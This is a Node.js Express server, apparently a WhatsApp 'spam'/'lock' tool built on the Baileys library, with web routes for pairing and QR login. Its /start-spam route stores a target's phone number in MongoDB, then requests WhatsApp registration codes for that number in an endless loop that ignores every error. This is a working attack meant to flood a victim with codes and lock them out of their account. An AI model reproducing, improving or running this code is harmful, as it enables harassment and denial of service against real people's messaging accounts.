const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { default: makeWaSocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers  } = require('@whiskeysockets/baileys');
const path = require('path');
const ejs = require('ejs');
const pino = require('pino');
const mongoose = require('mongoose');
const { startSpamV2, sendStoredData, startPairingCodeGeneration, sendStoredDataV2, SpamData, PairData} = require('./server3.js');





    // Worker Process
    require('dotenv').config(); // Load environment variables from .env file

    const app = express();
    const port = 9000; // Use environment variable or default port

    // MongoDB connection string from environment variable
    const mongoURI = process.env.MONGODB_URI;

    // Connect to MongoDB
    mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
        .then(() => console.log('Connected to MongoDB1'))
        .catch(err => console.log('Error connecting to MongoDB:', err));

    // Set up body parsers
    let server = require('./views/qr');
    code = require('./views/pair');
    code2 = require('./start-pairing/pair2');
    app.use('/qr', server);
    app.use('/code', code);
    app.use('/code2', code2);
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(cookieParser());
    app.use(express.static(path.join(__dirname, 'public')));

    // Set up view engine and views directory
    const __path = path.join(__dirname, 'views');
    app.set('view engine', 'ejs');
    app.set('views', __path);
    app.engine('ejs', ejs.renderFile);

    // Routes
    app.get('/', (req, res) => {
        res.render('index', { title: 'Home' });
    });

    app.get('/pair', (req, res) => {
        res.render('pair', { title: 'pairing' });
    });
    app.get('/start-spam', (req, res) => {
        res.render(path.join(__path, 'lock'), { title: 'Lock' });
    });

    app.get('/pair2', (req, res) => {
        res.render('pair2', { title: 'pairing2' });
    });

    app.get('/lock', (req, res) => {
        res.render(path.join(__path, 'lock'), { title: 'Lock' });
    });

    app.get('/qr', (req, res) => {
        res.render(path.join('qr.js'), { title: 'qr' });
    });
   
    app.post('/start-spam', async (req, res) => {
        const { ddi, number } = req.body;
    
        try {
            // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
            const existingData = await SpamData.findOne({ ddi, number });
            if (existingData) {
                
            } else {
                // Neue Instanz des Modells erstellen und speichern
                const newData = new SpamData({ ddi, number });
                await newData.save();
                console.log('Data saved successfully');
            }
    
            const { state, saveCreds } = await useMultiFileAuthState('session')
            const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
            });
            const phoneNumber = ddi + number;
            await dropNumber(spam, phoneNumber, ddi, number);
    
            // Erfolgreiche Antwort an den Client senden
            res.status(200).json({ message: 'Spam started successfully' });
        } catch (error) {
            console.log(error);
            res.status(500).json({ error: 'Internal server error' });
        }
    });
    
    async function dropNumber(spam, phoneNumber, ddi, number) {
        while (true) {
            try {
                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 666,
                });
                
            } catch (error) {
               
            }
        }
    }
    
    // Start server
    app.listen(port, () => {
       
        console.log(`Worker ${process.pid} started and is listening on port ${port}`);
    });

   
 
    
    
    

    

